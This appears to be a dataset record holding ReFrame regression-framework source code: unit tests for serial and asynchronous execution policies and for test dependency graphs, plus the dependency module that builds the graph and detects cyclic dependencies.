        self.runner = executors.Runner(policies.AsynchronousExecutionPolicy())
        self.runner.policy.keep_stage_files = True
        self.monitor = TaskEventMonitor()
        self.runner.policy.task_listeners.append(self.monitor)

    def set_max_jobs(self, value):
        for p in rt.runtime().system.partitions:
            p._max_jobs = value

    def read_timestamps(self, tasks):
        """"""Read the timestamps and sort them to permit simple
        concurrency tests.""""""
        from reframe.core.deferrable import evaluate

        self.begin_stamps = []
        self.end_stamps = []
        for t in tasks:
            with os_ext.change_dir(t.check.stagedir):
                with open(evaluate(t.check.stdout), 'r') as f:
                    self.begin_stamps.append(float(f.readline().strip()))
                    self.end_stamps.append(float(f.readline().strip()))

        self.begin_stamps.sort()
        self.end_stamps.sort()

    def test_concurrency_unlimited(self):
        checks = [SleepCheck(0.5) for i in range(3)]
        self.set_max_jobs(len(checks))
        self.runall(checks)

        # Ensure that all tests were run and without failures.
        self.assertEqual(len(checks), self.runner.stats.num_cases())
        self.assertEqual(0, len(self.runner.stats.failures()))

        # Ensure that maximum concurrency was reached as fast as possible
        self.assertEqual(len(checks), max(self.monitor.num_tasks))
        self.assertEqual(len(checks), self.monitor.num_tasks[len(checks)])

        self.read_timestamps(self.monitor.tasks)

        # Warn if not all tests were run in parallel; the corresponding strict
        # check would be:
        #
        #     self.assertTrue(self.begin_stamps[-1] <= self.end_stamps[0])
        #
        if self.begin_stamps[-1] > self.end_stamps[0]:
            self.skipTest('the system seems too much loaded.')

    def test_concurrency_limited(self):
        # The number of checks must be <= 2*max_jobs.
        checks = [SleepCheck(0.5) for i in range(5)]
        max_jobs = len(checks) - 2
        self.set_max_jobs(max_jobs)
        self.runall(checks)

        # Ensure that all tests were run and without failures.
        self.assertEqual(len(checks), self.runner.stats.num_cases())
        self.assertEqual(0, len(self.runner.stats.failures()))

        # Ensure that maximum concurrency was reached as fast as possible
        self.assertEqual(max_jobs, max(self.monitor.num_tasks))
        self.assertEqual(max_jobs, self.monitor.num_tasks[max_jobs])

        self.read_timestamps(self.monitor.tasks)

        # Ensure that the jobs after the first #max_jobs were each run after
        # one of the previous #max_jobs jobs had finished
        # (e.g. begin[max_jobs] > end[0]).
        # Note: we may ensure this strictly as we may ensure serial behaviour.
        begin_after_end = (b > e for b, e in zip(self.begin_stamps[max_jobs:],
                                                 self.end_stamps[:-max_jobs]))
        self.assertTrue(all(begin_after_end))

        # NOTE: to ensure that these remaining jobs were also run
        # in parallel one could do the command hereafter; however, it would
        # require to substantially increase the sleep time (in SleepCheck),
        # because of the delays in rescheduling (1s, 2s, 3s, 1s, 2s,...).
        # We currently prefer not to do this last concurrency test to avoid an
        # important prolongation of the unit test execution time.
        # self.assertTrue(self.begin_stamps[-1] < self.end_stamps[max_jobs])

        # Warn if the first #max_jobs jobs were not run in parallel; the
        # corresponding strict check would be:
        # self.assertTrue(self.begin_stamps[max_jobs-1] <= self.end_stamps[0])
        if self.begin_stamps[max_jobs-1] > self.end_stamps[0]:
            self.skipTest('the system seems too loaded.')

    def test_concurrency_none(self):
        checks = [SleepCheck(0.5) for i in range(3)]
        num_checks = len(checks)
        self.set_max_jobs(1)
        self.runall(checks)

        # Ensure that all tests were run and without failures.
        self.assertEqual(len(checks), self.runner.stats.num_cases())
        self.assertEqual(0, len(self.runner.stats.failures()))

        # Ensure that a single task was running all the time
        self.assertEqual(1, max(self.monitor.num_tasks))

        # Read the timestamps sorted to permit simple concurrency tests.
        self.read_timestamps(self.monitor.tasks)

        # Ensure that the jobs were run after the previous job had finished
        # (e.g. begin[1] > end[0]).
        begin_after_end = (b > e for b, e in zip(self.begin_stamps[1:],
                                                 self.end_stamps[:-1]))
        self.assertTrue(all(begin_after_end))

    def _run_checks(self, checks, max_jobs):
        self.set_max_jobs(max_jobs)
        self.assertRaises(KeyboardInterrupt, self.runall, checks)

        self.assertEqual(4, self.runner.stats.num_cases())
        self.assertEqual(4, len(self.runner.stats.failures()))
        self.assert_all_dead()

    def test_kbd_interrupt_in_wait_with_concurrency(self):
        checks = [KeyboardInterruptCheck(),
                  SleepCheck(10), SleepCheck(10), SleepCheck(10)]
        self._run_checks(checks, 4)

    def test_kbd_interrupt_in_wait_with_limited_concurrency(self):
        # The general idea for this test is to allow enough time for all the
        # four checks to be submitted and at the same time we need the
        # KeyboardInterruptCheck to finish first (the corresponding wait should
        # trigger the failure), so as to make the framework kill the remaining
        # three.
        checks = [KeyboardInterruptCheck(),
                  SleepCheck(10), SleepCheck(10), SleepCheck(10)]
        self._run_checks(checks, 2)

    def test_kbd_interrupt_in_setup_with_concurrency(self):
        checks = [SleepCheck(1), SleepCheck(1), SleepCheck(1),
                  KeyboardInterruptCheck(phase='setup')]
        self._run_checks(checks, 4)

    def test_kbd_interrupt_in_setup_with_limited_concurrency(self):
        checks = [SleepCheck(1), SleepCheck(1), SleepCheck(1),
                  KeyboardInterruptCheck(phase='setup')]
        self._run_checks(checks, 2)

    def test_poll_fails_main_loop(self):
        num_tasks = 3
        checks = [SleepCheckPollFail(10) for i in range(num_tasks)]
        num_checks = len(checks)
        self.set_max_jobs(1)
        self.runall(checks)
        stats = self.runner.stats
        self.assertEqual(num_tasks, stats.num_cases())
        self.assertEqual(num_tasks, len(stats.failures()))

    def test_poll_fails_busy_loop(self):
        num_tasks = 3
        checks = [SleepCheckPollFailLate(1/i) for i in range(1, num_tasks+1)]
        num_checks = len(checks)
        self.set_max_jobs(1)
        self.runall(checks)
        stats = self.runner.stats
        self.assertEqual(num_tasks, stats.num_cases())
        self.assertEqual(num_tasks, len(stats.failures()))


class TestDependencies(unittest.TestCase):
    class Node:
        """"""A node in the test case graph.

        It's simply a wrapper to a (test_name, partition, environment) tuple
        that can interact seemlessly with a real test case.
        It's meant for convenience in unit testing.
        """"""

        def __init__(self, cname, pname, ename):
            self.cname, self.pname, self.ename = cname, pname, ename

        def __eq__(self, other):
            if isinstance(other, type(self)):
                return (self.cname == other.cname and
                        self.pname == other.pname and
                        self.ename == other.ename)

            if isinstance(other, executors.TestCase):
                return (self.cname == other.check.name and
                        self.pname == other.partition.fullname and
                        self.ename == other.environ.name)

            return NotImplemented

        def __hash__(self):
            return hash(self.cname) ^ hash(self.pname) ^ hash(self.ename)

        def __repr__(self):
            return 'Node(%r, %r, %r)' % (self.cname, self.pname, self.ename)

    def has_edge(graph, src, dst):
        return dst in graph[src]

    def num_deps(graph, cname):
        return sum(len(deps) for c, deps in graph.items()
                   if c.check.name == cname)

    def find_check(name, checks):
        for c in checks:
            if c.name == name:
                return c

        return None

    def find_case(cname, ename, cases):
        for c in cases:
            if c.check.name == cname and c.environ.name == ename:
                return c

    def setUp(self):
        self.loader = RegressionCheckLoader([
            'unittests/resources/checks_unlisted/dependencies/normal.py'
        ])

        # Set runtime prefix
        rt.runtime().resources.prefix = tempfile.mkdtemp(dir='unittests')

    def tearDown(self):
        os_ext.rmtree(rt.runtime().resources.prefix)

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_eq_hash(self):
        find_case = TestDependencies.find_case
        cases = executors.generate_testcases(self.loader.load_all())

        case0 = find_case('Test0', 'e0', cases)
        case1 = find_case('Test0', 'e1', cases)
        case0_copy = case0.clone()

        assert case0 == case0_copy
        assert hash(case0) == hash(case0_copy)
        assert case1 != case0
        assert hash(case1) != hash(case0)

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps(self):
        Node = TestDependencies.Node
        has_edge = TestDependencies.has_edge
        num_deps = TestDependencies.num_deps
        find_check = TestDependencies.find_check
        find_case = TestDependencies.find_case

        checks = self.loader.load_all()
        cases = executors.generate_testcases(checks)

        # Test calling getdep() before having built the graph
        t = find_check('Test1_exact', checks)
        with pytest.raises(DependencyError):
            t.getdep('Test0', 'e0')

        # Build dependencies and continue testing
        deps = dependency.build_deps(cases)
        dependency.validate_deps(deps)

        # Check DEPEND_FULLY dependencies
        assert num_deps(deps, 'Test1_fully') == 8
        for p in ['sys0:p0', 'sys0:p1']:
            for e0 in ['e0', 'e1']:
                for e1 in ['e0', 'e1']:
                    assert has_edge(deps,
                                    Node('Test1_fully', p, e0),
                                    Node('Test0', p, e1))

        # Check DEPEND_BY_ENV
        assert num_deps(deps, 'Test1_by_env') == 4
        assert num_deps(deps, 'Test1_default') == 4
        for p in ['sys0:p0', 'sys0:p1']:
            for e in ['e0', 'e1']:
                assert has_edge(deps,
                                Node('Test1_by_env', p, e),
                                Node('Test0', p, e))
                assert has_edge(deps,
                                Node('Test1_default', p, e),
                                Node('Test0', p, e))

        # Check DEPEND_EXACT
        assert num_deps(deps, 'Test1_exact') == 6
        for p in ['sys0:p0', 'sys0:p1']:
            assert has_edge(deps,
                            Node('Test1_exact', p, 'e0'),
                            Node('Test0', p, 'e0'))
            assert has_edge(deps,
                            Node('Test1_exact', p, 'e0'),
                            Node('Test0', p, 'e1'))
            assert has_edge(deps,
                            Node('Test1_exact', p, 'e1'),
                            Node('Test0', p, 'e1'))

        # Pick a check to test getdep()
        check_e0 = find_case('Test1_exact', 'e0', cases).check
        check_e1 = find_case('Test1_exact', 'e1', cases).check
        assert check_e0.getdep('Test0', 'e0').name == 'Test0'
        assert check_e0.getdep('Test0', 'e1').name == 'Test0'
        assert check_e1.getdep('Test0', 'e1').name == 'Test0'
        with pytest.raises(DependencyError):
            check_e0.getdep('TestX', 'e0')

        with pytest.raises(DependencyError):
            check_e0.getdep('Test0', 'eX')

        with pytest.raises(DependencyError):
            check_e1.getdep('Test0', 'e0')

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps_unknown_test(self):
        find_check = TestDependencies.find_check
        checks = self.loader.load_all()

        # Add some inexistent dependencies
        test0 = find_check('Test0', checks)
        for depkind in ('default', 'fully', 'by_env', 'exact'):
            test1 = find_check('Test1_' + depkind, checks)
            if depkind == 'default':
                test1.depends_on('TestX')
            elif depkind == 'exact':
                test1.depends_on('TestX', rfm.DEPEND_EXACT, {'e0': ['e0']})
            elif depkind == 'fully':
                test1.depends_on('TestX', rfm.DEPEND_FULLY)
            elif depkind == 'by_env':
                test1.depends_on('TestX', rfm.DEPEND_BY_ENV)

            with pytest.raises(DependencyError):
                dependency.build_deps(executors.generate_testcases(checks))

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps_unknown_target_env(self):
        find_check = TestDependencies.find_check
        checks = self.loader.load_all()

        # Add some inexistent dependencies
        test0 = find_check('Test0', checks)
        test1 = find_check('Test1_default', checks)
        test1.depends_on('Test0', rfm.DEPEND_EXACT, {'e0': ['eX']})
        with pytest.raises(DependencyError):
            dependency.build_deps(executors.generate_testcases(checks))

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps_unknown_source_env(self):
        find_check = TestDependencies.find_check
        num_deps = TestDependencies.num_deps
        checks = self.loader.load_all()

        # Add some inexistent dependencies
        test0 = find_check('Test0', checks)
        test1 = find_check('Test1_default', checks)
        test1.depends_on('Test0', rfm.DEPEND_EXACT, {'eX': ['e0']})

        # Unknown source is ignored, because it might simply be that the test
        # is not executed for eX
        deps = dependency.build_deps(executors.generate_testcases(checks))
        assert num_deps(deps, 'Test1_default') == 4

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_build_deps_empty(self):
        assert {} == dependency.build_deps([])

    def create_test(self, name):
        test = rfm.RegressionTest()
        test.name = name
        test.valid_systems = ['*']
        test.valid_prog_environs = ['*']
        test.executable = 'echo'
        test.executable_opts = [name]
        return test

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_valid_deps(self):
        #
        #       t0       +-->t5<--+
        #       ^        |        |
        #       |        |        |
        #   +-->t1<--+   t6       t7
        #   |        |            ^
        #   t2<------t3           |
        #   ^        ^            |
        #   |        |            t8
        #   +---t4---+
        #
        t0 = self.create_test('t0')
        t1 = self.create_test('t1')
        t2 = self.create_test('t2')
        t3 = self.create_test('t3')
        t4 = self.create_test('t4')
        t5 = self.create_test('t5')
        t6 = self.create_test('t6')
        t7 = self.create_test('t7')
        t8 = self.create_test('t8')
        t1.depends_on('t0')
        t2.depends_on('t1')
        t3.depends_on('t1')
        t3.depends_on('t2')
        t4.depends_on('t2')
        t4.depends_on('t3')
        t6.depends_on('t5')
        t7.depends_on('t5')
        t8.depends_on('t7')
        dependency.validate_deps(
            dependency.build_deps(
                executors.generate_testcases([t0, t1, t2, t3, t4,
                                              t5, t6, t7, t8])
            )
        )

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_cyclic_deps(self):
        #
        #       t0       +-->t5<--+
        #       ^        |        |
        #       |        |        |
        #   +-->t1<--+   t6       t7
        #   |   |    |            ^
        #   t2  |    t3           |
        #   ^   |    ^            |
        #   |   v    |            t8
        #   +---t4---+
        #
        t0 = self.create_test('t0')
        t1 = self.create_test('t1')
        t2 = self.create_test('t2')
        t3 = self.create_test('t3')
        t4 = self.create_test('t4')
        t5 = self.create_test('t5')
        t6 = self.create_test('t6')
        t7 = self.create_test('t7')
        t8 = self.create_test('t8')
        t1.depends_on('t0')
        t1.depends_on('t4')
        t2.depends_on('t1')
        t3.depends_on('t1')
        t3.depends_on('t2')
        t4.depends_on('t2')
        t4.depends_on('t3')
        t6.depends_on('t5')
        t7.depends_on('t5')
        t8.depends_on('t7')
        deps = dependency.build_deps(
            executors.generate_testcases([t0, t1, t2, t3, t4,
                                          t5, t6, t7, t8])
        )

        with pytest.raises(DependencyError) as exc_info:
            dependency.validate_deps(deps)

        assert ('t4->t2->t1->t4' in str(exc_info.value) or
                't2->t1->t4->t2' in str(exc_info.value) or
                't1->t4->t2->t1' in str(exc_info.value) or
                't1->t4->t3->t1' in str(exc_info.value) or
                't4->t3->t1->t4' in str(exc_info.value) or
                't3->t1->t4->t3' in str(exc_info.value))

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_cyclic_deps_by_env(self):
        t0 = self.create_test('t0')
        t1 = self.create_test('t1')
        t1.depends_on('t0', rfm.DEPEND_EXACT, {'e0': ['e0']})
        t0.depends_on('t1', rfm.DEPEND_EXACT, {'e1': ['e1']})
        deps = dependency.build_deps(
            executors.generate_testcases([t0, t1])
        )
        with pytest.raises(DependencyError) as exc_info:
            dependency.validate_deps(deps)

        assert ('t1->t0->t1' in str(exc_info.value) or
                't0->t1->t0' in str(exc_info.value))

    @rt.switch_runtime(fixtures.TEST_SITE_CONFIG, 'sys0')
    def test_validate_deps_empty(self):
        dependency.validate_deps({})
/n/n/n",0
85,91855bdc8c0dcb933821be0fdb356cc43ffce585,"/reframe/frontend/dependency.py/n/n#
# Test case graph functionality
#

import collections
import itertools

import reframe as rfm
from reframe.core.exceptions import DependencyError


def build_deps(cases):
    """"""Build dependency graph from test cases.

    The graph is represented as an adjacency list in a Python dictionary
    holding test cases. The dependency information is also encoded inside each
    test cases.
    """"""

    # Index cases for quick access
    cases_by_part = {}
    cases_revmap = {}
    for c in cases:
        cname = c.check.name
        pname = c.partition.fullname
        ename = c.environ.name
        cases_by_part.setdefault((cname, pname), [])
        cases_revmap.setdefault((cname, pname, ename), None)
        cases_by_part[cname, pname].append(c)
        cases_revmap[cname, pname, ename] = c

    def resolve_dep(target, from_map, *args):
        errmsg = 'could not resolve dependency: %s' % target
        try:
            ret = from_map[args]
        except KeyError:
            raise DependencyError(errmsg)
        else:
            if not ret:
                raise DependencyError(errmsg)

            return ret

    # NOTE on variable names
    #
    # c stands for check or case depending on the context
    # p stands for partition
    # e stands for environment
    # t stands for target

    graph = {}
    for c in cases:
        graph[c] = c.deps
        cname = c.check.name
        pname = c.partition.fullname
        ename = c.environ.name
        for dep in c.check.user_deps():
            tname, how, subdeps = dep
            if how == rfm.DEPEND_FULLY:
                c.deps.extend(resolve_dep(c, cases_by_part, tname, pname))
            elif how == rfm.DEPEND_BY_ENV:
                c.deps.append(resolve_dep(c, cases_revmap,
                                          tname, pname, ename))
            elif how == rfm.DEPEND_EXACT:
                for env, tenvs in subdeps.items():
                    if env != ename:
                        continue

                    for te in tenvs:
                        c.deps.append(resolve_dep(c, cases_revmap,
                                                  tname, pname, te))

    return graph


def print_deps(graph):
    for c, deps in graph.items():
        print(c, '->', deps)


def validate_deps(graph):
    """"""Validate dependency graph.""""""

    # Reduce test case graph to a test name only graph; this disallows
    # pseudo-dependencies as follows:
    #
    # (t0, e1) -> (t1, e1)
    # (t1, e0) -> (t0, e0)
    #
    # This reduction step will result in a graph description with duplicate
    # entries in the adjacency list; this is not a problem, cos they will be
    # filtered out during the DFS traversal below.
    test_graph = {}
    for case, deps in graph.items():
        test_deps = [d.check.name for d in deps]
        try:
            test_graph[case.check.name] += test_deps
        except KeyError:
            test_graph[case.check.name] = test_deps

    # Check for cyclic dependencies in the test name graph
    visited = set()
    unvisited = list(
        itertools.zip_longest(test_graph.keys(), [], fillvalue=None)
    )
    path = []
    while unvisited:
        node, parent = unvisited.pop()
        while path and path[-1] != parent:
            path.pop()

        adjacent = reversed(test_graph[node])
        path.append(node)
        for n in adjacent:
            if n in path:
                cycle_str = '->'.join(path + [n])
                raise DependencyError(
                    'found cyclic dependency between tests: ' + cycle_str)

            if n not in visited:
                unvisited.append((n, node))

        visited.add(node)
/n/n/n/unittests/test_policies.py/n/nimport collections
import os
import pytest
import tempfile
import unittest

import reframe as rfm
import reframe.core.runtime as rt
import reframe.frontend.dependency as dependency
import reframe.frontend.executors as executors
import reframe.frontend.executors.policies as policies
import reframe.utility.os_ext as os_ext
from reframe.core.exceptions import DependencyError, JobNotStartedError
from reframe.frontend.loader import RegressionCheckLoader
import unittests.fixtures as fixtures
from unittests.resources.checks.hellocheck import HelloTest
from unittests.resources.checks.frontend_checks import (
    BadSetupCheck,
    BadSetupCheckEarly,
    KeyboardInterruptCheck,
    RetriesCheck,
    SleepCheck,
    SleepCheckPollFail,
    SleepCheckPollFailLate,
    SystemExitCheck,
)


class TestSerialExecutionPolicy(unittest.TestCase):
    def setUp(self):
        self.loader = RegressionCheckLoader(['unittests/resources/checks'],
                                            ignore_conflicts=True)

        # Setup the runner
        self.runner = executors.Runner(policies.SerialExecutionPolicy())
        self.checks = self.loader.load_all()

        # Set runtime prefix
        rt.runtime().resources.prefix = tempfile.mkdtemp(dir='unittests')

        # Reset current_run
        rt.runtime()._current_run = 0

    def tearDown(self):
        os_ext.rmtree(rt.runtime().resources.prefix)

    def runall(self, checks, *args, **kwargs):
        cases = executors.generate_testcases(checks, *args, **kwargs)
        self.runner.runall(cases)

    def _num_failures_stage(self, stage):
        stats = self.runner.stats
        return len([t for t in stats.failures() if t.failed_stage == stage])

    def assert_all_dead(self):
        stats = self.runner.stats
        for t in self.runner.stats.tasks():
            try:
                finished = t.check.poll()
            except JobNotStartedError:
                finished = True

            self.assertTrue(finished)

    def test_runall(self):
        self.runall(self.checks)

        stats = self.runner.stats
        self.assertEqual(7, stats.num_cases())
        self.assertEqual(4, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(1, self._num_failures_stage('performance'))

    def test_runall_skip_system_check(self):
        self.runall(self.checks, skip_system_check=True)

        stats = self.runner.stats
        self.assertEqual(8, stats.num_cases())
        self.assertEqual(4, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(1, self._num_failures_stage('performance'))

    def test_runall_skip_prgenv_check(self):
        self.runall(self.checks, skip_environ_check=True)

        stats = self.runner.stats
        self.assertEqual(8, stats.num_cases())
        self.assertEqual(4, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(1, self._num_failures_stage('performance'))

    def test_runall_skip_sanity_check(self):
        self.runner.policy.skip_sanity_check = True
        self.runall(self.checks)

        stats = self.runner.stats
        self.assertEqual(7, stats.num_cases())
        self.assertEqual(3, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(0, self._num_failures_stage('sanity'))
        self.assertEqual(1, self._num_failures_stage('performance'))

    def test_runall_skip_performance_check(self):
        self.runner.policy.skip_performance_check = True
        self.runall(self.checks)

        stats = self.runner.stats
        self.assertEqual(7, stats.num_cases())
        self.assertEqual(3, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(0, self._num_failures_stage('performance'))

    def test_strict_performance_check(self):
        self.runner.policy.strict_check = True
        self.runall(self.checks)

        stats = self.runner.stats
        self.assertEqual(7, stats.num_cases())
        self.assertEqual(5, len(stats.failures()))
        self.assertEqual(2, self._num_failures_stage('setup'))
        self.assertEqual(1, self._num_failures_stage('sanity'))
        self.assertEqual(2, self._num_failures_stage('performance'))

    def test_force_local_execution(self):
        self.runner.policy.force_local = True
        self.runall([HelloTest()])
        stats = self.runner.stats
        for t in stats.tasks():
            self.assertTrue(t.check.local)

    def test_kbd_interrupt_within_test(self):
        check = KeyboardInterruptCheck()
        self.assertRaises(KeyboardInterrupt, self.runall, [check])
        stats = self.runner.stats
        self.assertEqual(1, len(stats.failures()))
        self.assert_all_dead()

    def test_system_exit_within_test(self):
        check = SystemExitCheck()

        # This should not raise and should not exit
        self.runall([check])
        stats = self.runner.stats
        self.assertEqual(1, len(stats.failures()))

    def test_retries_bad_check(self):
        max_retries = 2
        checks = [BadSetupCheck(), BadSetupCheckEarly()]
        self.runner._max_retries = max_retries
        self.runall(checks)

        # Ensure that the test was retried #max_retries times and failed.
        self.assertEqual(2, self.runner.stats.num_cases())
        self.assertEqual(max_retries, rt.runtime().current_run)
        self.assertEqual(2, len(self.runner.stats.failures()))

        # Ensure that the report does not raise any exception.
        self.runner.stats.retry_report()

    def test_retries_good_check(self):
        max_retries = 2
        checks = [HelloTest()]
        self.runner._max_retries = max_retries
        self.runall(checks)

        # Ensure that the test passed without retries.
        self.assertEqual(1, self.runner.stats.num_cases())
        self.assertEqual(0, rt.runtime().current_run)
        self.assertEqual(0, len(self.runner.stats.failures()))

    def test_pass_in_retries(self):
        max_retries = 3
        run_to_pass = 2
        # Create a file containing the current_run; Run 0 will set it to 0,
        # run 1 to 1 and so on.
        with tempfile.NamedTemporaryFile(mode='wt', delete=False) as fp:
            fp.write('0\n')

        checks = [RetriesCheck(run_to_pass, fp.name)]
        self.runner._max_retries = max_retries
        self.runall(checks)

        # Ensure that the test passed after retries in run #run_to_pass.
        self.assertEqual(1, self.runner.stats.num_cases())
        self.assertEqual(1, len(self.runner.stats.failures(run=0)))
        self.assertEqual(run_to_pass, rt.runtime().current_run)
        self.assertEqual(0, len(self.runner.stats.failures()))
        os.remove(fp.name)


class TaskEventMonitor(executors.TaskEventListener):
    """"""Event listener for monitoring the execution of the asynchronous
    execution policy.

    We need to make sure two things for the async policy:

    1. The number of running tasks never exceed the max job size per partition.
    2. Given a set of regression tests with a reasonably long runtime, the
       execution policy must be able to reach the maximum concurrency. By
       reasonably long runtime, we mean that that the regression tests must run
       enough time, so as to allow the policy to execute all the tests until
       their ""run"" phase, before the first submitted test finishes.
    """"""

    def __init__(self):
        super().__init__()

        # timeline of num_tasks
        self.num_tasks = [0]
        self.tasks = []

    def on_task_run(self, task):
        super().on_task_run(task)
        last = self.num_tasks[-1]
        self.num_tasks.append(last + 1)
        self.tasks.append(task)

    def on_task_exit(self, task):
        last = self.num_tasks[-1]
        self.num_tasks.append(last - 1)

    def on_task_success(self, task):
        pass

    def on_task_failure(self, task):
        pass


class TestAsynchronousExecutionPolicy(TestSerialExecutionPolicy):
    def setUp(self):
        super().setUp()
        self.runner = executors.Runner(policies.AsynchronousExecutionPolicy())
        self.runner.policy.keep_stage_files = True
        self.monitor = TaskEventMonitor()
        self.runner.policy.task_listeners.append(self.monitor)

    def set_max_jobs(self, value):
        for p in rt.runtime().system.partitions:
            p._max_jobs = value

    def read_timestamps(self, tasks):
        """"""Read the timestamps and sort them to permit simple
        concurrency tests.""""""
        from reframe.core.deferrable import evaluate

        self.begin_stamps = []
        self.end_stamps = []
        for t in tasks:
            with os_ext.change_dir(t.check.stagedir):
                with open(evaluate(t.check.stdout), 'r') as f:
                    self.begin_stamps.append(float(f.readline().strip()))
                    self.end_stamps.append(float(f.readline().strip()))

        self.begin_stamps.sort()
        self.end_stamps.sort()

    def test_concurrency_unlimited(self):
        checks = [SleepCheck(0.5) for i in range(3)]
        self.set_max_jobs(len(checks))
        self.runall(checks)

        # Ensure that all tests were run and without failures.
        self.assertEqual(len(checks), self.runner.stats.num_cases())
        self.assertEqual(0, len(self.runner.stats.failures()))

        # Ensure that maximum concurrency was reached as fast as possible
        self.assertEqual(len(checks), max(self.monitor.num_tasks))
        self.assertEqual(len(checks), self.monitor.num_tasks[len(checks)])

        self.read_timestamps(self.monitor.tasks)

        # Warn if not all tests were run in parallel; the corresponding strict
        # check would be:
        #
        #     self.assertTrue(self.begin_stamps[-1] <= self.end_stamps[0])
        #
        if self.begin_stamps[-1] > self.end_stamps[0]:
            self.skipTest('the system seems too much loaded.')

    def test_concurrency_limited(self):
        # The number of checks must be <= 2*max_jobs.
        checks = [SleepCheck(0.5) for i in range(5)]
        max_jobs = len(checks) - 2
        self.set_max_jobs(max_jobs)
        self.runall(checks)

        # Ensure that all tests were run and without failures.
        self.assertEqual(len(checks), self.runner.stats.num_cases())
        self.assertEqual(0, len(self.runner.stats.failures()))

        # Ensure that maximum concurrency was reached as fast as possible
        self.assertEqual(max_jobs, max(self.monitor.num_tasks))
        self.assertEqual(max_jobs, self.monitor.num_tasks[max_jobs])

        self.read_timestamps(self.monitor.tasks)

        # Ensure that the jobs after the first #max_jobs were each run after
        # one of the previous #max_jobs jobs had finished
        # (e.g. begin[max_jobs] > end[0]).
        # Note: we may ensure this strictly as we may ensure serial behaviour.
        begin_after_end = (b > e for b, e in zip(self.begin_stamps[max_jobs:],
                                                 self.end_stamps[:-max_jobs]))
        self.assertTrue(all(begin_after_end))

        # NOTE: to ensure that these remaining jobs were also run
        # in parallel one could do the command hereafter; however, it would
        # require to substantially increase the sleep time (in SleepCheck),
        # because of the delays in rescheduling (1s, 2s, 3s, 1s, 2s,...).
        # We currently prefer not to do this last concurrency test to avoid an
        # important prolongation of the unit test execution time.
        # self.assertTrue(self.begin_stamps[-1] < self.end_stamps[max_jobs])

        # Warn if the first #max_jobs jobs were not run in parallel; the
        # corresponding strict check would be:
        # self.assertTrue(self.begin_stamps[max_jobs-1] <= self.end_stamps[0])
        if self.begin_stamps[max_jobs-1] > self.end_stamps[0]:
            self.skipTest('the system seems too loaded.')

    def test_concurrency_none(self):
        checks = [SleepCheck(0.5) for i in range(3)]
        num_checks = len(checks)
        self.set_max_jobs(1)
        self.runall(checks)

        # Ensure that all tests were run and without failures.
        self.assertEqual(len(checks), self.runner.stats.num_cases())
        self.assertEqual(0, len(self.runner.stats.failures()))

        # Ensure that a single task was running all the time
        self.assertEqual(1, max(self.monitor.num_tasks))

        # Read the timestamps sorted to permit simple concurrency tests.
        self.read_timestamps(self.monitor.tasks)

        # Ensure that the jobs were run after the previous job had finished
        # (e.g. begin[1] > end[0]).
        begin_after_end = (b > e for b, e in zip(self.begin_stamps[1:],
                                                 self.end_stamps[:-1]))
        self.assertTrue(all(begin_after_end))

    def _run_checks(self, checks, max_jobs):
        self.set_max_jobs(max_jobs)
        self.assertRaises(KeyboardInterrupt, self.runall, checks)

        self.assertEqual(4, self.runner.stats.num_cases())
        self.assertEqual(4, len(self.runner.stats.failures()))
        self.assert_all_dead()

    def test_kbd_interrupt_in_wait_with_concurrency(self):
        checks = [KeyboardInterruptCheck(),
                  SleepCheck(10), SleepCheck(10), SleepCheck(10)]
        self._run_checks(checks, 4)

    def test_kbd_interrupt_in_wait_with_limited_concurrency(self):
        # The general idea for this test is to allow enough time for all the
        # four checks to be submitted and at the same time we need the
        # KeyboardInterruptCheck to finish first (the corresponding wait should
        # trigger the failure), so as to make the framework kill the remaining
        # three.
        checks = [KeyboardInterruptCheck(),
                  SleepCheck(10), SleepCheck(10), SleepCheck(10)]
        self._run_checks(checks, 2)

    def test_kbd_interrupt_in_setup_with_concurrency(self):
        checks = [SleepCheck(1), SleepCheck(1), SleepCheck(1),
                  KeyboardInterruptCheck(phase='setup')]
        self._run_checks(checks, 4)

    def test_kbd_interrupt_in_setup_with_limited_concurrency(self):
        checks = [SleepCheck(1), SleepCheck(1), SleepCheck(1),
                  KeyboardInterruptCheck(phase='setup')]
        self._run_checks(checks, 2)

    def test_poll_fails_main_loop(self):
        num_tasks = 3
        checks = [SleepCheckPollFail(10) for i in range(num_tasks)]
        num_checks = len(checks)
        self.set_max_jobs(1)
        self.runall(checks)
        stats = self.runner.stats
        self.assertEqual(num_tasks, stats.num_cases())
        self.assertEqual(num_tasks, len(stats.failures()))

    def test_poll_fails_busy_loop(self):
        num_tasks = 3
        checks = [SleepCheckPollFailLate(1/i) for i in range(1, num_tasks+1)]
        num_checks = len(checks)
        self.set_max_jobs(1)
        self.runall(checks)
        stats = self.runner.stats
        self.assertEqual(num_tasks, stats.num_cases())
        self.assertEqual(num_tasks, len(stats.failures()))


class TestDependencies(unittest.TestCase):
    class Node:
        """"""A node in the test case graph.

        It's simply a wrapper to a (test_name, partition, environment) tuple
        that can interact seemlessly with a real test case.
        It's meant for convenience in unit testing.
        """"""

        def __init__(self, cname, pname, ename):
            self.cname, self.pname, self.ename = cname, pname, ename

        def __eq__(self, other):
            if isinstance(other, type(self)):
                return (self.cname == other.cname and
                        self.pname == other.pname and
                        self.ename == other.ename)

            if isinstance(other, executors.TestCase):
                return (self.cname == other.check.name and
